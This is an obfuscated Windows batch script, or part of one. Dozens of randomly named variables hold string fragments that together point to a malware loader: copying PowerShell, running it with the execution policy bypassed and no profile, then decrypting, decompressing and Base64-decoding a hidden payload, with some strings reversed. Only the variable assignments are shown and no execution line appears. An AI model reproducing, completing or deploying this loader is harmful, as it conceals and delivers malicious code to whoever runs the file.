@echo off
set "QcefpqEswf=po"
set "PtfQUnkWGt=we"
set "zFhQcQNjim=\v"
set "iqSmDSNFzr=co"
set "iOrNLPMMjR=rs"
set "WLiyWuWAdm=he"
set "zTkNSDrcfO=ll"
set "qKTuHlcenH=0\"
set "eCzkvpEDUi= /"
set "ArQptoLGOY=Sy"
set "yrEnGzcYKo=py"
set "XTsPRdlHTz=1."
set "LhOEYtvlmc=ll"
set "AKXcmoLauM=32"
set "HwuiylkADO=Po"
set "wcrszbLrtz=.e"
set "ERjFqXRRut=xe"
set "FCFbnpLtsc=s\"
set "ETzepaiaZO=\W"
set "scwkBmdpfN=nd"
set "RrJCxWHrsN=do"
set "GCpNaqAncW=ow"
set "DbSyvPxuXm=em"
set "NpzxyyzrUE=in"
set "OJVAwUOmzB=he"
set "xJHuuMrDbu=y "
set "gVnChQmlpL= C"
set "NBbhpKCNjv=ws"
set "GNsRoSPZMU=we"
set "GEuFcyBwTU=st"
set "sQIlamnrhO=rS"
set "bRkUkepUva=Wi"
set "riQqlKUzsI=:\"
set "JHCckeSjEz=cd"
set "ayNeSpdJvu= %~dp0"
set "stkmwLTvaX=mPUl"
set "lmkHYXnQrg=stem"
set "vbAWCxQkDM=ress"
set "ePNMmuvStj=C.Pa"
set "UYnGEWnOHN=ct S"
set "vyKbqXrIqw=esaB"
set "kNjKvyMIIM=.Cry"
set "UECoRkrjbo=6] -"
set "JoBUzVKahO=Disp"
set "mFKIOaCpai=PUld"
set "ztPZqitgFN=gMod"
set "uVeCdTKHlf=VA);"
set "UhYAbSMfRy=::De"
set "lGWCBOsWOB=..-1"
set "iuYvtrJBhM=bjec"
set "rNNuZAfgjr=-joi"
set "KLIDwXBlsQ=)) {"
set "rOBYdSpHPy=L4Yi"
set "qwaPlUgAEx=rans"
set "WTaZeePQxQ=]::N"
set "IWoiCvtXSo=form"
set "OwWrmXtNwB=.Mem"
set "rVKouDhULb=();$"
set "nYgYrBsztF=Obje"
set "clfNdqkIyP=e]::"
set "EhacegcWTV=bgyI"
set "WGtbyVuXQw=New-"
set "BzKkJtlICt=mPUl"
set "HaBlpKDoIa=-nop"
set "ovsJqesxlx=rofi"
set "nWxpWzNFgQ=)($n"
set "mLEQWoYGIW=lit("
set "BZLsdmjeKI=[Sys"
set "rWwWOiIpCp=ateD"
set "TOJxqFGSZS=ing("
set "ieOTAxYZyE=[Sys"
set "oovxESesYM=($NG"
set "ZubbseuitW=yTo("
set "xXYAZupxyz=FzmC"
set "HOMBDAbhip=ew-O"
set "ZcTuzWoWMf='0Pg"
set "dlglhFPZaL=n) {"
set "yizgweTUuV=Obje"
set "fTFNddUdBl=On ="
set "SznnJjKSls=1] -"
set "XIYZyoThhD=y.Pa"
set "kcdcHwKvre=orF'"
set "fkMNnVXfmQ=Comp"
set "PJDuukCHTU=-ep "
set "jlhGTRwfPa=ddin"
set "llFNEVcccu=6esa"
set "jDMRCDyTFd=tion"
set "zwifZsGYNH=NMVA"
set "QVUAYJzLGW=nPg "
set "rvVFrtFkvY=y.Ci"
set "rsEFYkCWih=O.Me"
set "NtFSzCvqQk=V = "
set "XZueslBhAj=$mPU"
set "FxQIyYQeyQ=[Env"
set "oucSqCbhFR=ck($"
set "auwrJkamfR=daeR"
set "xNdqAGxNFA=bstr"
set "jUeyKijxQP=morF"
set "qFiHdPPJHo=tsWi"
set "VMCuBempuj=FzmC"
set "EhkVCKofng='txe"
set "KPkNNjDQcm=-1.."
set "zkOmpihuZK=ment"
set "NwJOhKmKHM=-joi"
set "qUOjNjOnAJ=FzmC"
set "lGyzALQPXT== $D"
set "opElSHQrvA=New-"
set "WNZeIBwNAy=Secu"
set "anQjpgpoaj=..-1"
set "khCqbbhPIr=ert]"
set "dYzwJEOvyw=Syst"
set "ANLDTQEAvN=eMVs"
